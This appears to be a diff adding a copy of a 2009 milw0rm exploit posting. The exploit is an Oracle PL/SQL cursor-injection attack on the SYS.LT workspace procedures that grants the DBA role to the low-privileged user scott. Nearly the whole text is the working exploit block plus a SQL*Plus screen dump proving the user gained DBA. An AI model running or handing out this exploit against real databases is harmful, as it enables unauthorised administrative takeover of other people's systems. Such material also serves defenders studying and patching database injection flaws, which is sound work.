@@ -1,0 +1,56 @@
+This is slightly modified version of: http://milw0rm.com/exploits/7677
+This is based on cursor injection and does not need create function privileges:
+
+DECLARE
+D NUMBER;
+BEGIN
+D := DBMS_SQL.OPEN_CURSOR;
+DBMS_SQL.PARSE(D,'declare pragma autonomous_transaction; begin execute immediate ''grant dba to scott'';commit;end;',0);
+SYS.LT.CREATEWORKSPACE('a''and dbms_sql.execute('||D||')=1--');
+SYS.LT.COMPRESSWORKSPACETREE('a''and dbms_sql.execute('||D||')=1--');
+end;
+
+#-----------screen dump---------------------------------------------------#
+SQL> select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SCOTT                          CONNECT                        NO  YES NO
+SCOTT                          EXECUTE_CATALOG_ROLE           NO  YES NO
+SCOTT                          RESOURCE                       NO  YES NO
+
+SQL> DECLARE
+  2  D NUMBER;
+  3  BEGIN
+  4  D := DBMS_SQL.OPEN_CURSOR;
+  5  DBMS_SQL.PARSE(D,'declare pragma autonomous_transaction; begin execute imme
+diate ''grant dba to scott'';commit;end;',0);
+  6  SYS.LT.CREATEWORKSPACE('a''and dbms_sql.execute('||D||')=1--');
+  7  SYS.LT.COMPRESSWORKSPACETREE('a''and dbms_sql.execute('||D||')=1--');
+  8  end;
+  9
+ 10
+ 11  /
+DECLARE
+*
+ERROR at line 1:
+ORA-01403: no data found
+ORA-06512: at "SYS.LT", line 6118
+ORA-06512: at "SYS.LT", line 6087
+ORA-06512: at line 7
+
+
+SQL> select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SCOTT                          CONNECT                        NO  YES NO
+SCOTT                          DBA                            NO  YES NO
+SCOTT                          EXECUTE_CATALOG_ROLE           NO  YES NO
+SCOTT                          RESOURCE                       NO  YES NO
+
+
+Sid
+www.notsosecure.com
+
+# milw0rm.com [2009-07-02]
